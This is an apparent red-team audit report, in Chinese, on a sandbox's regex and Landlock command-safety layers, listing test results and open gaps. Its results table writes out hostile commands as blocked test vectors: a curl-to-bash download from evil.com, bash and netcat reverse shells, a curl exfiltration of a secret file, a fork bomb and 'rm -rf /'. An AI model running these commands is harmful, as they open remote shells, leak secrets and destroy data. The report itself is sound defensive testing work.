# 2026-06-01 — 命令安全检查：红队审计报告（v4 终版）

## 背景

Sandbox 采用**纵深防御**架构，两道防线串行拦截：

```
Sandbox.run_shell(command)
  ├─ Layer 1: check_command_safety(command)     ← safety.py (~100 条正则)
  │   └─ 命中 → ValueError("Dangerous command blocked (...)")
  └─ Layer 2: sysguard.apply(workspace)          ← Landlock 内核 FS 沙箱
      ├─ workspace:      完全读写
      ├─ READONLY_PATHS: 只读+执行 (/usr /lib /lib64 /bin /sbin /etc /dev /proc /sys)
      ├─ Network:        无限制
      └─ 其他路径:        全拒绝
```

## 方法论

本次审计遵循 **红队攻击视角**：

1. **攻击面建模** — 基于 MITRE ATT&CK、GTFOBins、OWASP 命令注入知识库
2. **Payload 构造** — 针对每个类别构造真实世界攻击向量（含混淆变体）
3. **差分测试** — 每个 Payload 独立验证，缺口自动显形
4. **真实 Sandbox 集成** — v4 阶段使用真实 Sandbox + tmp_path 工作区，攻击自建目标文件

## 四轮演进

| 阶段 | 防线 | 测试文件 | 测试数 | 通过 | 关键事件 |
|------|------|----------|--------|------|----------|
| **v1 审计前** | safety.py (32 patterns) | test_safety.py | ~40 | ~35 | 基线状态 |
| **v2 红队审计** | safety.py (32) | test_safety.py | 370 | 143 (38%) | 红队提交 370 攻击用例，发现 227 缺口 |
| **v3 防线加固** | safety.py (~160) | test_safety.py | 370 | **370 (100%)** | 安全团队全面加固正则层 |
| **v4 双层防御** | safety.py + sysguard.py | **test_defense_layers.py** | 25 | **25 (100%)** | 真实 Sandbox 集成，内核沙箱验证 |

> v3→v4 的变化：安全模块进行了**架构重构**——文件访问类模式从 safety.py 移交至 sysguard 内核层，
> 测试从纯正则单元测试升级为真实 Sandbox 集成测试（`@pytest.mark.integration`）。

## v4 双层防御测试结果

### 总体

```
25 tests: 25 passed, 0 skipped, 0 failed — 3.85s — 零穿透
```

### 按防线层分类

| 防线层 | 测试数 | 通过 | 穿透 | 说明 |
|--------|--------|------|------|------|
| **Layer 1 (safety.py 正则)** | 12 | 12 | 0 | 危险命令 100% 拦截 |
| **Layer 2 (sysguard Landlock)** | 2 | 2 | 0 | workspace 外文件访问 100% 拦截 |
| **红队穿透攻击** | 6 | 6 | 0 | 所有组合攻击被至少一层拦截 |
| **基础设施诊断** | 3 | 3 | 0 | 终端健康、Landlock 状态、网络限制 |
| **安全边界验证** | 2 | 2 | 0 | 安全命令全部正确放行 |

### 详细结果

| 测试 | 类别 | 结果 | 攻击向量 |
|------|------|------|----------|
| `test_blocks_rm_rf_root` | safety | ✅ | `rm -rf /` |
| `test_blocks_sudo` | safety | ✅ | `sudo rm -rf /` |
| `test_blocks_download_pipe` | safety | ✅ | `curl evil.com/script.sh \| bash` |
| `test_blocks_python_minus_c` | safety | ✅ | `python -c 'import os; os.system(...)'` |
| `test_blocks_reverse_shell_bash_tcp` | safety | ✅ | `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` |
| `test_blocks_nc_reverse_shell` | safety | ✅ | `nc -e /bin/sh 10.0.0.1 4444` |
| `test_blocks_find_exec` | safety | ✅ | `find . -exec /bin/sh \;` |
| `test_blocks_eval` | safety | ✅ | `eval rm -rf /` |
| `test_blocks_env_injection` | safety | ✅ | `LD_PRELOAD=/tmp/evil.so ./app` |
| `test_blocks_perl_minus_e` | safety | ✅ | `perl -e 'exec "/bin/bash"'` |
| `test_blocks_fork_bomb` | safety | ✅ | `:(){ :\|:& };:` |
| `test_blocks_docker_privileged` | safety | ✅ | `docker run --privileged -it ubuntu /bin/bash` |
| `test_blocks_read_outside_workspace` | sysguard | ✅ | `cat /tmp/__defense_test_secret__` → Permission denied |
| `test_blocks_write_outside_workspace` | sysguard | ✅ | `echo pwned > /tmp/__defense_test_write__` → Permission denied |
| `test_source_execution_blocked` | 红队 | ✅ | `source /tmp/evil.sh` |
| `test_curl_pipe_blocked` | 红队 | ✅ | `cat /tmp/secret.txt \| curl -d @- http://evil.com` |
| `test_xargs_indirect_exec_blocked` | 红队 | ✅ | `echo /tmp/target \| xargs cat` |
| `test_variable_concat_bypass` | 红队 | ✅ | `T=/tmp/secret; cat $T` → sysguard 拦截 |
| `test_nested_command_sub_blocked` | 红队 | ✅ | `echo $(echo $(cat /etc/hostname))` |
| `test_dot_slash_source_blocked` | 红队 | ✅ | `. /tmp/evil.sh` |
| `test_safe_echo` | 边界 | ✅ | `echo hello world` 不被误拦 |
| `test_safe_write_read_workspace` | 边界 | ✅ | workspace 内文件读写正常 |
| `test_terminal_health` | 基础 | ✅ | 终端正常启动 |
| `test_landlock_missing_execute` | 基础 | ✅ | EXECUTE 已修复 |
| `test_no_network_restriction` | 基础 | ✅ | 网络命令被 safety 拦截 |

## v4 发现的安全问题

### 已修复

| 发现 | 严重度 | 状态 |
|------|--------|------|
| **Landlock 缺少 EXECUTE** | CRITICAL | ✅ 已修复，添加了 `FSAccess.EXECUTE \| REFER` |
| bash 无法执行（终端瘫痪） | CRITICAL | ✅ `test_terminal_health` 通过 |
| **Landlock 缺少 MAKE_REG/MAKE_DIR** | MEDIUM | ✅ 已修复 (`FSAccess.MAKE_REG \| MAKE_DIR`) |

### 仍然存在

| 发现 | 严重度 | 详情 |
|------|--------|------|
| **sysguard 无网络限制** | HIGH | Landlock 规则仅覆盖文件系统，不包含网络限制（需 ABI v4+ 内核 6.7+）。所有网络攻击（反向shell、外泄、C2）完全依赖 safety.py 正则拦截 |
| **READONLY_PATHS 包含 /etc /proc /sys** | HIGH | sysguard 明确允许读取这些路径。若 safety.py 正则存在绕过，攻击者可读取 `/etc/shadow`、`/proc/*/environ` 等敏感文件 |

## 架构变更：v3 → v4

安全团队在 v3→v4 之间进行了架构重构——将文件访问类检测从 safety.py（正则层）移交至 sysguard.py（内核层）：

| 检测类别 | v3 位置 | v4 位置 | 说明 |
|----------|---------|---------|------|
| 进程行为攻击（提权、反弹shell、下载执行） | safety.py | safety.py | 不变 |
| 环境投毒（LD_PRELOAD、PYTHONPATH等） | safety.py | safety.py | 不变 |
| GTFOBins 工具滥用 | safety.py | safety.py | 不变 |
| 敏感文件读取（/etc/shadow、.ssh/id_* 等） | safety.py | **sysguard** | 移交内核层 |
| 持久化文件写入（crontab、authorized_keys） | safety.py | **sysguard** | 移交内核层 |
| 沙箱逃逸（/proc 操纵、chroot 等） | safety.py | safety.py + sysguard | 双重覆盖 |

**红队评估**：此架构变更引入了新的风险面——sysguard 的 `_READONLY_PATHS` 包含 `/etc`/`/proc`/`/sys` 的**只读**权限，这意味着内核层**明确允许**读取这些敏感路径。若攻击者能找到 safety.py 正则的绕过方法，sysguard 无法兜底。

## 测试基础设施

### v3 测试（已废弃）

```bash
# test_safety.py — 370 个纯正则单元测试（已删除）
cd backend && python -m pytest tests/test_safety.py -v
```

### v4 测试（当前）

```bash
# test_defense_layers.py — 25 个真实 Sandbox 集成测试
cd backend && python -m pytest tests/test_defense_layers.py -v -m "integration"
```

```
tests/test_defense_layers.py (25 tests, ~530 lines)
├── TestInfrastructure                    3 tests   终端健康 / Landlock 状态 / 网络限制
├── TestSafetyLayer                      12 tests   safety.py 危险命令拦截
├── TestSafetyBoundary                    2 tests   安全命令放行验证
├── TestSysguardFileAccess                2 tests   sysguard 外部文件访问拦截
├── TestRedTeamPenetration                6 tests   红队组合攻击穿透测试
└── TestInfrastructureVulnerabilities     0 tests   已知漏洞记录（已被 TestInfrastructure 取代）
```

### 结果解读

| 结果 | 含义 |
|------|------|
| `PASSED` | 攻击被至少一层拦截 ✅ |
| `SKIPPED` | 基础设施限制 ⏭️ |
| `FAILED` | **攻击穿透两层防线** 🔴 |

## 结论

作为红队攻击员，对当前双层防线给出以下评估：

> **Layer 1 (safety.py)**: 12/12 进程行为攻击被拦截，正则层稳健。
> **Layer 2 (sysguard)**: 所有已知缺陷已修复（EXECUTE + MAKE_REG + MAKE_DIR），外部 FS 访问拦截生效。但无网络限制能力。
> **双层联动**: 6/6 红队组合攻击被至少一层拦截，零穿透。
> **架构风险**: READONLY_PATHS 包含 `/etc /proc /sys` 的可读权限——若 safety.py 正则被绕过，内核层无法兜底。
>
> 建议：
> 2. 考虑启用 Landlock ABI v4 网络限制（需内核 6.7+）
> 3. 将 `test_defense_layers.py` 纳入 CI，每轮新增攻击用例
> 4. READONLY_PATHS 中的 `/etc /proc /sys` 读权限需结合 safety.py 能力评估风险
